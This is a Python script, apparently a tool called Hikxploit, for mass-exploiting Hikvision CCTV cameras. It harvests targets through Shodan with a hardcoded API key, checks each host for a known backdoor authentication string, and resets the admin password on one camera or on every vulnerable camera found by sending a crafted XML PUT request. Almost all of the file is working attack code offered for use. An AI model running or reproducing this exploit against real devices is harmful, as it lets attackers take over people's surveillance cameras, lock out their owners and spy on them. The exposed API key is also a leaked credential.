# -*- coding: utf-8 -*-
import sys
import socket
from socket import error as socket_error
import os
import time
import shodan
from blessings import Terminal
import requests
import re
import subprocess

global path
global host

t = Terminal()
path = os.path.abspath(os.path.dirname(sys.argv[0]))
#api_shodan_key = open(path + "/api.txt","r").read()
api_shodan_key = "fr62gh78X2MzHCHcDf6mDxropyQ4XhIR"
api = shodan.Shodan(api_shodan_key)
userID = ""
userName = ""
newPass = ""
host = open(path + '/host.txt' , 'r').read().splitlines()
vuln_host = open(path + '/vuln_host.txt', 'r').read().splitlines()
BackdoorAuthArg = "auth=YWRtaW46MTEK"
def usage():
    print t.yellow(""" ____  ____   _   __                       __           _   _    
|_   ||   _| (_) [  |  _                  [  |         (_) / |_  
  | |__| |   __   | | / ]  _   __  _ .--.  | |  .--.   __ `| |-' 
  |  __  |  [  |  | '' <  [ \ [  ][ '/'`\ \| |/ .'`\ \[  | | |   
 _| |  | |_  | |  | |`\ \  > '  <  | \__/ || || \__. | | | | |,  
|____||____|[___][__|  \_][__]`\_] | ;.__/[___]'.__.' [___]\__/  
                                  [__|                           """)
    print t.green("""+------------------------------------------------------------+
|     exploit all the vulnerable cctv from hikvision         |
|------------------------------------------------------------|
| Usage:                                                     |
| 1. Gather host with shodan (api needed)                    |
| 2. Gather host with censys.io (api needed)                 |
| 3. scan for vuln host                                      |
| 4. mass exploit all vuln CCTV                              |
| 5. select a CCTV'S ip to exploit                           |
| 6. random exploit CCTV from the vuln list                  |
+------------------------------------------------------------+""")
                                                                
def gather_host_shodan():
    try:
        query = raw_input("["+t.blue("*")+"]"+ " enter a valid shodan query:")
        response = api.search(query)
        with open('/home/nothing/Hikxploit/host.txt',"wb") as host:
            for service in response['matches']:
                host.write(service['ip_str']+ ":" + str(service['port']))#host.write(service['port']
                host.write("\n")
    except KeyboardInterrupt:
        print t.red("\n[---]exiting now[---]")



def mass_exploit():
    #   VERY DANGEROUS
    global target_host
    global port
    pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
    pattern_2 = r'(\:).*'
    a = 0
    while a < len(host):
        res = host[a]
        match1 = re.search(pattern_1, res)
        match2 = re.search(pattern_2, res)
        target_host = match1.group()
        port_raw = match2.group()
        port = port_raw[1:]
        newPass = raw_input(t.red('[*]'+'please choose a new password:'))
        userID = "1"
        userName = "admin"
        userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
        URLBase = "http://"+target_host+str(port) + "/"
        URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
        requests.put(URLUpload, data=userXML).text
        a += 1

def select_host_exploit():
    global target_host
    global port
    pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
    pattern_2 = r'(\:).*'
    b = 0
    while b < len(host):
        res = host[b]
        print str(b) + ". " + host[b]
        print "\n"
        b += 1
    sel = raw_input(t.blue('[+]')+"please select a number for a specific host to hack:")
    res = host[int(sel)]
    match1 = re.search(pattern_1 , res)
    match2 = re.search(pattern_2 , res)
    target_host = match1.group()
    port_raw = match2.group()
    port = port_raw[1:]
    newPass = raw_input(t.red('[*]'+'please choose a new password:'))
    userName = "admin"
    userID = "1"
    userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
    URLBase = "http://"+target_host+ ":" +str(port) + "/"
    URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
    requests.put(URLUpload, data=userXML).text
    print(t.green('[out]Changed password of admin to ' + newPass + ' at ' +res))

def vuln_scan():
    print"[+]Loading all host..."
    a = 0
    try:
        while a < len(host):
            global target_host
            global port
            pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
            pattern_2 = r'(\:).*'
            res = host[a]
            match1 = re.search(pattern_1 , res)
            match2 = re.search(pattern_2 , res)
            target_host = match1.group()
            port_raw = match2.group()
            port = port_raw[1:]
            try:
                client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                client.settimeout(5)
                client.connect((target_host,int(port)))
                client.send("GET /HTTP/1.1\r\nHost: google.com\r\n\r\n")
                response = client.recv(4096)
                x = True
            except socket_error:
                x = False
            except KeyboardInterrupt:
                print t.red("\n[---]exiting now[---]")
            if x == True:
                with open(path + '/vuln_host.txt',"a") as host_up:
                    host_up.write(target_host + ":" + port + "\n")
            elif x == False:
                pass
            
            a += 1
    except KeyboardInterrupt:
        print t.red("\n[---]exiting now[---]")
def vuln_scan_exp():
    os.system("rm -rf " + path + "/host.txt")
    open(path + '/host.txt', 'w')
    p = 0
    while p < len(vuln_host):
        ip_to_check = vuln_host[p]
        response = requests.get('http://'+ip_to_check+'/security/users/1?'+ BackdoorAuthArg)
        if response.status_code == 200:
            with open(path + '/host.txt' , 'a') as host_vuln:
                host_vuln.write(ip_to_check + "\n")
        elif response.status_code ==401:
            pass
        p += 1
    
    
            
        
    
def scan():
    vuln_scan()
    vuln_scan_exp()

    
    
    
def response():
    global usage
    usage = raw_input(t.red('[#]Select an option:'))
    if str(usage) == "1":
        gather_host_shodan()
    elif str(usage) == "2":
        print"WIP"
    elif str(usage) == "3":
        scan()
    elif str(usage) == "4":
        print(t.red('[!!!]')+t.green('Very dangerous option please be carefull'))
        answer = raw_input(t.green('[???]')+t.blue('do you wanna continue? [y/n]'))
        if str(answer) == "y":
            mass_exploit()
        elif str(answer) == "n":
            response()
    elif str(usage) == "5":
        select_host_exploit()
    elif str(usage) == "6":
        print"WIP"
        
    



    
def main():
    try:
        usage()
        response()
    except KeyboardInterrupt:
        print t.red("\n[---]exiting now[---]")
main()




